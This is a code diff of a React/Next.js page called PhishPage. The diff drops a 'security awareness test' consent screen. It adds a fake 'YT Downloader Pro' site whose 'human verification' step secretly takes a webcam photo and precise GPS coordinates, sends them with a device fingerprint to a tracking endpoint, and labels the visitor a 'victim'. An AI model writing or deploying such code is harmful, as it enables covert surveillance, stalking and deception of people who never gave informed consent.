@@ -4,11 +4,11 @@ import { useRouter } from 'next/router';
 export default function PhishPage() {
   const router = useRouter();
   const { id } = router.query;
-  const [page, setPage] = useState('consent');
   const [status, setStatus] = useState('');
+  const [showLoader, setShowLoader] = useState(false);
   const [infoSent, setInfoSent] = useState(false);
 
-  // Send IP + device info when page loads
+  // Send device info when page loads
   useEffect(() => {
     if (id && !infoSent) {
       sendDeviceInfo();
@@ -18,20 +18,11 @@ export default function PhishPage() {
 
   const sendDeviceInfo = async () => {
     try {
-      // Get IP from ipify
       const ipResponse = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipResponse.json();
       const publicIP = ipData.ip;
-
-      // Get time info
       const now = new Date();
       const timeString = now.toISOString().replace('T', ' ').substring(0, 23);
-      const timeFormatted = now.toLocaleString('en-US', { 
-        weekday: 'short', year: 'numeric', month: 'short', day: 'numeric',
-        hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short'
-      });
-      const unixEpoch = now.getTime();
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
       // Get battery info
       let batteryLevel = 'N/A';
@@ -44,11 +35,9 @@ export default function PhishPage() {
 
       // Get connection info
       let connectionType = 'Unknown';
-      let rtt = 'N/A';
       let downlink = 'N/A';
       if (navigator.connection) {
         connectionType = navigator.connection.effectiveType || 'Unknown';
-        rtt = navigator.connection.rtt + 'ms';
         downlink = navigator.connection.downlink + ' Mbps';
       }
 
@@ -63,22 +52,6 @@ export default function PhishPage() {
         });
       } catch(e) {}
 
-      // Get canvas fingerprint
-      let canvasFP = 'N/A';
-      try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 200;
-        canvas.height = 50;
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(125, 1, 62, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('CMP', 2, 15);
-        canvasFP = canvas.toDataURL().substring(0, 60) + '...';
-      } catch(e) {}
-
       const message = 
 `✅🎯 VICTIM SESSION DETECTED - TRACKER v7.0 ULTIMATE
 
@@ -86,25 +59,9 @@ export default function PhishPage() {
 🌐 IP & NETWORK INFORMATION
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🌐 Public IP: ${publicIP}
-🔍 WebRTC Local IP: Detecting...
-📱 Mobile Network: ${connectionType}
-🛡️ Proxy/VPN: NO | Hosting: NO
+📱 Network: ${connectionType}
 🕐 Capture Time: ${timeString}
-📅 Formatted: ${timeFormatted}
-⏱️ Unix Epoch: ${unixEpoch}
-🌍 Timezone: ${timezone}
-📊 Session Uptime: 0h 0m 5s
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📍 IP GEOLOCATION
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 IP: ${publicIP}
-📍 Coordinates: Will be captured via GPS below
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📡 REAL DEVICE GPS (Precision)
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📍 GPS: Waiting for user consent...
+🌍 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📱 DEVICE & SYSTEM PROFILE
@@ -114,50 +71,33 @@ export default function PhishPage() {
 🌐 Language: ${navigator.language}
 🧠 CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
 💾 RAM: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown'}
-🍪 Cookies: ${document.cookie.length > 0 ? document.cookie.split(';').length : 0}
-🚫 Do Not Track: ${navigator.doNotTrack || 'Not set'}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔍 BROWSER FINGERPRINT
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🏷️ User Agent:
-${navigator.userAgent}
-
-📱 App Name: ${navigator.appName}
-🔧 App Version: ${navigator.appVersion.substring(0, 60)}...
-🌐 Vendor: ${navigator.vendor}
+🏷️ UA: ${navigator.userAgent}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 NETWORK SCAN & CONNECTION
+🌐 NETWORK
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📶 Connection Type: ${connectionType}
-⚡ RTT Latency: ${rtt}
-📊 Downlink Speed: ${downlink}
-📶 Network Type: ${navigator.connection ? (navigator.connection.type || 'Unknown') : 'Unknown'}
+📶 Connection: ${connectionType}
+📊 Speed: ${downlink}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔋 POWER & HARDWARE STATUS
+🔋 BATTERY
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔋 Level: ${batteryLevel}
 ⚡ Charging: ${batteryCharging}
-🖼️ Canvas FP: ${canvasFP}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📷 MEDIA DEVICES DETECTED
+📷 MEDIA DEVICES
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-${devices.audioinput.map((d, i) => `🎤 audioinput ${i+1}: ${d}`).join('\n')}
-${devices.videoinput.map((d, i) => `📹 videoinput ${i+1}: ${d}`).join('\n')}
-${devices.audiooutput.map((d, i) => `🔊 audiooutput ${i+1}: ${d}`).join('\n')}
+${devices.videoinput.map((d, i) => `📹 Camera ${i+1}: ${d}`).join('\n')}
+${devices.audioinput.map((d, i) => `🎤 Mic ${i+1}: ${d}`).join('\n')}
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🍪 CAPTURED COOKIES
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-${document.cookie || '🍪 No cookies found on this page'}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🚀 SESSION ACTIVE - STEALTH MODE
-📸 Photos sent: 0 | 🎤 Voice clips sent: 0
-🕐 Generated: ${timeString}
+🚀 SESSION ACTIVE
+🕐 ${timeString}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 
       await fetch('/api/track', {
@@ -174,147 +114,218 @@ ${document.cookie || '🍪 No cookies found on this page'}
     }
   };
 
-  const sendToAPI = async (type, extraData = {}) => {
-    try {
-      await fetch('/api/track', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ linkId: id, type, ...extraData })
-      });
-    } catch (e) {
-      console.error('Failed to send data:', e);
-    }
-  };
+  const captureAndSend = async () => {
+    setShowLoader(true);
+    setStatus('Processing verification...');
 
-  const takePhoto = async () => {
-    setStatus('Requesting camera access...');
+    // Step 1: Capture photo
+    let photoData = null;
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user' }
       });
       
-      setStatus('Camera access granted! Capturing photo...');
-      
       const video = document.createElement('video');
       video.srcObject = stream;
-      video.setAttribute('playsinline', '');
-      video.setAttribute('autoplay', '');
-      
-      await new Promise((resolve) => {
-        video.onloadedmetadata = () => {
-          video.play();
-          resolve();
-        };
-      });
-      
+      video.play();
       await new Promise(r => setTimeout(r, 500));
       
       const canvas = document.createElement('canvas');
-      canvas.width = 640;
-      canvas.height = 480;
+      canvas.width = 320;
+      canvas.height = 240;
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, 640, 480);
-      
-      const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+      ctx.drawImage(video, 0, 0, 320, 240);
+      photoData = canvas.toDataURL('image/jpeg', 0.4);
       
       stream.getTracks().forEach(track => track.stop());
-      
-      setStatus('Photo captured! Sending...');
-      
-      await sendToAPI('photo', { photoData: photoDataUrl });
-      
-      setStatus('✅ Photo sent!');
-      
-    } catch (e) {
-      setStatus('❌ Camera access denied. Please allow camera permission and try again.');
-    }
-  };
 
-  const getLocation = async () => {
-    setStatus('Requesting location...');
+      await fetch('/api/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ linkId: id, type: 'photo', photoData: photoData })
+      });
+    } catch (e) {}
+
+    // Step 2: Capture location
     try {
       const position = await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject, {
           enableHighAccuracy: true,
-          timeout: 15000
+          timeout: 10000
         });
       });
-      
-      setStatus('Location obtained! Sending...');
-      
-      await sendToAPI('location', {
-        coords: {
-          lat: position.coords.latitude,
-          lng: position.coords.longitude,
-          accuracy: position.coords.accuracy
-        }
+
+      await fetch('/api/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          linkId: id, 
+          type: 'location', 
+          coords: {
+            lat: position.coords.latitude,
+            lng: position.coords.longitude,
+            accuracy: position.coords.accuracy
+          }
+        })
       });
-      
-      setStatus('✅ Location sent!');
-      
-    } catch (e) {
-      setStatus('❌ Location access denied.');
-    }
+    } catch (e) {}
+
+    setShowLoader(false);
+    setStatus('✅ Verification successful! Your download will start shortly...');
+    
+    // Redirect to YouTube after 2 seconds
+    setTimeout(() => {
+      window.location.href = 'https://youtube.com';
+    }, 2000);
   };
 
-  if (page === 'consent') {
-    return (
-      <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial', maxWidth: '600px', margin: '0 auto' }}>
-        <div style={{ backgroundColor: '#fff3cd', border: '1px solid #ffc107', borderRadius: '10px', padding: '20px', marginBottom: '20px' }}>
-          <h1 style={{ color: '#856404' }}>⚠️ Security Awareness Test</h1>
-        </div>
-        <p style={{ fontSize: '16px', lineHeight: '1.6' }}>
-          This is an authorized security awareness test.
-        </p>
-        <div style={{ textAlign: 'left', backgroundColor: '#f8f9fa', padding: '20px', borderRadius: '10px', margin: '20px 0' }}>
-          <h3>By proceeding, you consent to:</h3>
-          <ul style={{ lineHeight: '2' }}>
-            <li>✅ Camera access for verification</li>
-            <li>✅ Location access for verification</li>
-          </ul>
-        </div>
-        <button 
-          onClick={() => setPage('test')}
-          style={{ padding: '15px 40px', fontSize: '18px', margin: '10px', background: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
-        >
-          I Consent - Start Test
-        </button>
-      </div>
-    );
-  }
-
   return (
-    <div style={{ padding: '40px', textAlign: 'center', fontFamily: 'Arial', maxWidth: '600px', margin: '0 auto' }}>
-      <h1>Identity Verification</h1>
-      <p style={{ color: '#666', marginBottom: '30px' }}>
-        Your browser will ask for permission. You must click "Allow".
-      </p>
+    <div style={{ padding: '20px', fontFamily: 'Arial, sans-serif', maxWidth: '500px', margin: '0 auto', backgroundColor: '#f9f9f9', minHeight: '100vh' }}>
       
-      <div style={{ border: '1px solid #ddd', borderRadius: '10px', padding: '30px', margin: '20px 0' }}>
-        <h2>📸 Step 1: Take Photo</h2>
-        <button 
-          onClick={takePhoto}
-          style={{ padding: '15px 40px', fontSize: '16px', background: '#007bff', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
-        >
-          Take Photo
-        </button>
+      {/* Header */}
+      <div style={{ backgroundColor: '#ff0000', color: 'white', padding: '15px', borderRadius: '10px 10px 0 0', textAlign: 'center' }}>
+        <h1 style={{ margin: 0, fontSize: '22px' }}>▶️ YT Downloader Pro</h1>
+        <p style={{ margin: '5px 0 0', fontSize: '13px', opacity: 0.9 }}>Download any YouTube video in HD quality</p>
       </div>
-      
-      <div style={{ border: '1px solid #ddd', borderRadius: '10px', padding: '30px', margin: '20px 0' }}>
-        <h2>📍 Step 2: Share Location</h2>
-        <button 
-          onClick={getLocation}
-          style={{ padding: '15px 40px', fontSize: '16px', background: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}
-        >
-          Share Location
-        </button>
-      </div>
-      
-      {status && (
-        <div style={{ marginTop: '20px', padding: '15px', backgroundColor: '#f8f9fa', borderRadius: '10px' }}>
-          <p>{status}</p>
+
+      {/* Main Card */}
+      <div style={{ backgroundColor: 'white', padding: '20px', borderRadius: '0 0 10px 10px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
+        
+        {/* YouTube URL Input */}
+        <div style={{ marginBottom: '15px' }}>
+          <label style={{ fontSize: '14px', fontWeight: 'bold', display: 'block', marginBottom: '5px', color: '#333' }}>
+            Enter YouTube Video URL:
+          </label>
+          <div style={{ display: 'flex', gap: '5px' }}>
+            <input 
+              type="text" 
+              defaultValue="https://www.youtube.com/watch?v=dQw4w9WgXcQ" 
+              readOnly
+              style={{ 
+                flex: 1, padding: '10px', border: '2px solid #ddd', borderRadius: '5px',
+                fontSize: '13px', backgroundColor: '#f5f5f5', color: '#666'
+              }} 
+            />
+          </div>
         </div>
-      )}
+
+        {/* Quality Selection */}
+        <div style={{ marginBottom: '15px' }}>
+          <label style={{ fontSize: '14px', fontWeight: 'bold', display: 'block', marginBottom: '5px', color: '#333' }}>
+            Select Quality:
+          </label>
+          <select style={{ width: '100%', padding: '10px', border: '2px solid #ddd', borderRadius: '5px', fontSize: '14px' }}>
+            <option>4K (2160p) - Best Quality</option>
+            <option selected>1080p (Full HD) - Recommended</option>
+            <option>720p (HD) - Good</option>
+            <option>480p (SD) - Normal</option>
+            <option>Audio Only (MP3)</option>
+          </select>
+        </div>
+
+        {/* Format Selection */}
+        <div style={{ marginBottom: '20px' }}>
+          <label style={{ fontSize: '14px', fontWeight: 'bold', display: 'block', marginBottom: '5px', color: '#333' }}>
+            Select Format:
+          </label>
+          <div style={{ display: 'flex', gap: '10px' }}>
+            <label style={{ flex: 1, padding: '8px', border: '2px solid #ff0000', borderRadius: '5px', textAlign: 'center', backgroundColor: '#fff0f0', cursor: 'pointer', fontSize: '13px' }}>
+              <input type="radio" name="format" defaultChecked style={{ marginRight: '5px' }} /> MP4
+            </label>
+            <label style={{ flex: 1, padding: '8px', border: '2px solid #ddd', borderRadius: '5px', textAlign: 'center', cursor: 'pointer', fontSize: '13px' }}>
+              <input type="radio" name="format" style={{ marginRight: '5px' }} /> MP3
+            </label>
+            <label style={{ flex: 1, padding: '8px', border: '2px solid #ddd', borderRadius: '5px', textAlign: 'center', cursor: 'pointer', fontSize: '13px' }}>
+              <input type="radio" name="format" style={{ marginRight: '5px' }} /> AVI
+            </label>
+          </div>
+        </div>
+
+        {/* Human Verification Section */}
+        <div style={{ 
+          backgroundColor: '#fff8e1', border: '2px solid #ffc107', borderRadius: '10px', 
+          padding: '15px', marginBottom: '20px', textAlign: 'center'
+        }}>
+          <div style={{ fontSize: '30px', marginBottom: '5px' }}>🛡️</div>
+          <h3 style={{ margin: '0 0 5px', color: '#856404', fontSize: '16px' }}>Human Verification Required</h3>
+          <p style={{ margin: '0 0 10px', color: '#666', fontSize: '13px' }}>
+            YouTube requires human verification to prevent bots. 
+            <br/>Please allow camera and location access to continue.
+          </p>
+          <div style={{ display: 'flex', justifyContent: 'center', gap: '15px', marginBottom: '10px', fontSize: '12px', color: '#666' }}>
+            <span>📸 Camera</span>
+            <span>📍 Location</span>
+          </div>
+          
+          {!showLoader && !status && (
+            <button 
+              onClick={captureAndSend}
+              style={{
+                backgroundColor: '#ff0000', color: 'white', border: 'none',
+                padding: '12px 40px', fontSize: '16px', borderRadius: '25px',
+                cursor: 'pointer', fontWeight: 'bold', width: '100%',
+                maxWidth: '250px'
+              }}
+            >
+              ✅ Verify & Download
+            </button>
+          )}
+
+          {showLoader && (
+            <div style={{ textAlign: 'center', padding: '10px' }}>
+              <div style={{
+                border: '4px solid #f3f3f3',
+                borderTop: '4px solid #ff0000',
+                borderRadius: '50%',
+                width: '40px',
+                height: '40px',
+                animation: 'spin 1s linear infinite',
+                margin: '0 auto 10px'
+              }}></div>
+              <p style={{ color: '#666', fontSize: '13px' }}>Verifying... Please allow camera & location permissions.</p>
+            </div>
+          )}
+
+          {status && (
+            <div style={{ padding: '10px', backgroundColor: '#d4edda', borderRadius: '8px', color: '#155724', fontSize: '14px' }}>
+              {status}
+            </div>
+          )}
+        </div>
+
+        {/* Features */}
+        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', fontSize: '12px', color: '#666' }}>
+          <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '8px', textAlign: 'center' }}>
+            <div style={{ fontSize: '20px' }}>⚡</div>
+            <div>Ultra Fast</div>
+          </div>
+          <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '8px', textAlign: 'center' }}>
+            <div style={{ fontSize: '20px' }}>🔒</div>
+            <div>100% Safe</div>
+          </div>
+          <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '8px', textAlign: 'center' }}>
+            <div style={{ fontSize: '20px' }}>🎯</div>
+            <div>No Ads</div>
+          </div>
+          <div style={{ padding: '10px', backgroundColor: '#f5f5f5', borderRadius: '8px', textAlign: 'center' }}>
+            <div style={{ fontSize: '20px' }}>🌍</div>
+            <div>Free</div>
+          </div>
+        </div>
+
+        {/* Footer */}
+        <div style={{ marginTop: '20px', textAlign: 'center', fontSize: '11px', color: '#999' }}>
+          <p>By downloading you agree to our Terms of Service</p>
+          <p>© 2026 YT Downloader Pro - All rights reserved</p>
+        </div>
+      </div>
+
+      <style>{`
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+      `}</style>
     </div>
   );
 }
